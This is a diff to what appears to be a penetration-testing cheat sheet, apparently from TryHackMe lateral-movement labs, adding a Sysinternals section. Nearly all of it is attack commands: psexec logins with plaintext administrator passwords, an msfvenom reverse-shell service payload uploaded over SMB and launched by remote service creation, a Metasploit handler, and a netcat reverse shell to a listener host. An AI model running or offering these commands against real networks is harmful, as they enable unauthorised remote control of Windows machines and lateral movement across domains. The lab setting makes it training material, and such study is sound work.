@@ -501,3 +501,27 @@ Then check status of created user:
 ```
 net user pwnd
 ```
+
+## Sysinternals
+
+https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
+https://download.sysinternals.com/files/PSTools.zip
+
+psexec64.exe \\10.200.19.249 -u Administrator -p Mypass123 -i cmd.exe
+psexec64.exe \\10.200.19.101 -u Administrator -p Mypass123 -i cmd.exe
+psexec64.exe \\10.200.19.201 -u Administrator -p Mypass123 -i cmd.exe
+psexec64.exe \\10.200.19.249\Admin$ -u Administrator -p Mypass123 -i cmd.exe
+
+```
+$username = 'Administrator';
+$password = 'Mypass123';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+```
+```
+msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
+smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
+msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444; run"
+```
+runas /netonly /user:za\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.10.208.253 4443"
+sc.exe \\thmiis.za.tryhackme.com create THMservice-253 binPath= "c:\myservice253.exe" start= auto
